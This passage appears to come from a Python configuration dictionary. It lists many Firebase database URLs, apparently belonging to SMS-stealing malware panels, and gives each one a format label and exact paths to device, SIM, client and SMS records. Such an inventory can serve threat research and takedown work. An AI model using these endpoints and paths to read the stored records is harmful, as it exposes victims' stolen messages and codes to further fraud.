  "https://proffercelawte-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://punamamit-9e27a-default-rtdb.firebaseio.com": {"fmt": "panel-wala-lite", "paths": {"deviceInfo": "All_Users/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://rahul-5c37e-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://rahul-60a03-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://rahul980rahul-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://rahult-6230c-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://rajkumar-72afc-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://rajpal-tow-admin-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": None, "user_data": None, "user_sms": None}},
  "https://raju-b3e2b-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://ramj-2fccd-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://ramu-admin-panel-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://ranaia-cbd13-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://randi-a0d83-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://ranjit-8a94c-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://ravan-aa04e-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://ravan-id-default-rtdb.firebaseio.com": {"fmt": "panel-wala-lite", "paths": {"deviceInfo": "All_Users/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://rddds-cb466-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://remoo-f5ec1-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://rkadmin0-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://rockeysinghagsg-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://rohan-3-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://rohit-admin-e4345-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://roshani-177f4-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://rrrrqrt-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://rto-103-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": None, "messages": None, "user_data": "user_data", "user_sms": None}},
  "https://rto-115-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": None, "messages": None, "user_data": "user_data", "user_sms": "user_sms"}},
  "https://rto-116-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": None, "messages": None, "user_data": "user_data", "user_sms": "user_sms"}},
  "https://rto-118-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": None, "messages": None, "user_data": "user_data", "user_sms": "user_sms"}},
  "https://rto-12-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": None, "messages": None, "user_data": "user_data", "user_sms": "user_sms"}},
  "https://rto-132-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": None, "user_data": "user_data", "user_sms": "user_sms"}},
  "https://rto-137-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": None, "messages": None, "user_data": "user_data", "user_sms": "user_sms"}},
  "https://rto-142-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": None, "messages": None, "user_data": "user_data", "user_sms": "user_sms"}},
  "https://rto-17-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://rto-30-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": None, "user_data": "user_data", "user_sms": None}},
  "https://rto-33-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": None, "user_data": "user_data", "user_sms": "user_sms"}},
  "https://rto-38-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": None, "user_data": "user_data", "user_sms": "user_sms"}},
  "https://rto-39-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": None, "user_data": "user_data", "user_sms": "user_sms"}},
  "https://rto-40-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": None, "user_data": "user_data", "user_sms": "user_sms"}},
  "https://rto-500-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": None, "messages": None, "user_data": "user_data", "user_sms": "user_sms"}},
  "https://rto-55-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": None, "user_data": "user_data", "user_sms": "user_sms"}},
  "https://rto-58-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": "user_sms"}},
  "https://rto-62-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": None, "user_data": None, "user_sms": None}},
  "https://rto101-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": None, "messages": None, "user_data": "user_data", "user_sms": None}},
  "https://rto104-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": None, "user_data": None, "user_sms": None}},
  "https://rto111-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": None, "messages": None, "user_data": "user_data", "user_sms": "user_sms"}},
  "https://rto143-default-rtdb.firebaseio.com": {"fmt": "unknown", "paths": {}},
  "https://rto188-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": None, "messages": None, "user_data": "user_data", "user_sms": "user_sms"}},
  "https://rto233-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://rto234-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": None, "messages": None, "user_data": "user_data", "user_sms": "user_sms"}},
  "https://rto294-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": None, "messages": None, "user_data": "user_data", "user_sms": "user_sms"}},
  "https://rudara-f0004-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://ruff-panel-default-rtdb.firebaseio.com": {"fmt": "spy", "paths": {"deviceInfo": "All_Users/Data/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://rupesh-123-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://sabji-d4378-default-rtdb.europe-west1.firebasedatabase.app": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://sachin-ec9f0-default-rtdb.firebaseio.com": {"fmt": "unknown", "paths": {}},
  "https://safi-b575f-default-rtdb.firebaseio.com": {"fmt": "panel-wala-lite", "paths": {"deviceInfo": "All_Users/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://sahil781-59dd4-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://sala-v1-410b3-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://sand-5daec-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://sanjay-bhai-34-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://sanjay-e3c4c-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://santosh-new-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://sg-betal-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://shivajimaharaj-35881-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://shrity-481cd-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://sitaya-a4733-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://sk-admin-v19-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://sk-admin-v2-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://sk-admin-v6-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://sk-admin-v7-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://sk-admin-v8-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://sonu-panel-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://sourav-4c188-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://spy-16-default-rtdb.firebaseio.com": {"fmt": "spy", "paths": {"deviceInfo": "All_Users/Data/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://spy-20-default-rtdb.firebaseio.com": {"fmt": "spy", "paths": {"deviceInfo": "All_Users/Data/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://spy-30-default-rtdb.firebaseio.com": {"fmt": "spy", "paths": {"deviceInfo": "All_Users/Data/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://ssboss1-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://subhu-jiiiii-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://subhu-own-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://subhubhai-85804-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://sundhaiii-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://sunilmahra-ad144-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://taaaar-f97b6-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://taniya-setup-panel-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://teleinfo-39c72-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://tinku-152d3-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://tinku-7f10d-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://tino23-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://tino30-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://tino31-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://tino44-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://tino50-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://tino56-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://tnkul-4f260-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://trhhtjhtdf-default-rtdb.asia-southeast1.firebasedatabase.app": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://ttarun-319eb-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://twoo-2c7e8-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://ueur-357f2-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://ujjpmkisan-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://vicky-singh-20bdd-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://victim-bdf8f-default-rtdb.firebaseio.com": {"fmt": "panel-wala-lite", "paths": {"deviceInfo": "All_Users/DeviceInfo", "simDetails": "All_Users/simDetails", "sms": "All_Users/sms"}},
  "https://vijay1-39156-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://virat-58ba8-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://vishnu-b9ec2-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://vivov-df9bb-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://vkdhapra-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://vsbsvs-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://weshshop-50591-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://yadavfire-8c07f-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://yoyo22222-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://zee-01-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://zmnzkimkb-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": None, "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},

  # --- added batch ---
  "https://aaji-a603e-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://abhi-7d1a4-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://abhishek-f2b3d-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://admin-1327a-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://admin-ce4f5-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://admin-okahge-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://admin-panel-client-12b0f-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://admin-projector-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://adminpenal-bd78c-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://ads-panel-03-38176-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://amanadmin-23d93-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://ankit-4-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://arjun1-36862-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://ash-papa-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://assh-op-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://atifhere-4354a-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://backkup-651ff-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://bad-boy-2ccf2-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://bandi-13-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://basic01-33b38-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://berlinxmirroragain-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://bihari1234-d34f3-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://burikismat-e9f7d-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://ck-admin-122-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://ck-admin-126-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://ck-admin-130-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://ck-admin-230-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://ck-admin-232-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://danw-penal-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://dapp-binance-signals-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://demon-lord-2bd5d-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://devil-6c0aa-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://do-admin-v9-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://dsnext-50e4e-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://e30jdjdmh-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://fcghhv-f5541-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://fir-52ad0-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://fir-5f6b6-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://gahaah-765eb-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://gang-e710f-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://gareebi-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://ghar-f1dfb-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://golunew-73dc4-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://hamza-admin-3-35346-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://hello-pikachu-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://hineyyy-16ec5-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://hunter-d9ae3-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://ipl2025-62676-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://johntheedoon-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://juhi-d605f-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://kallu-madarchod-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://khanpanel-c31a2-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://legend-pannel-66-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://liaroplundkitopi-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://lol33-93b46-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://lucero-b79d9-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
  "https://mama-4cee1-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": "user_data", "user_sms": None}},
  "https://matrixpannel37-default-rtdb.firebaseio.com": {"fmt": "rto-sala", "paths": {"devices": "devices", "clients": "clients", "messages": "messages", "user_data": None, "user_sms": None}},
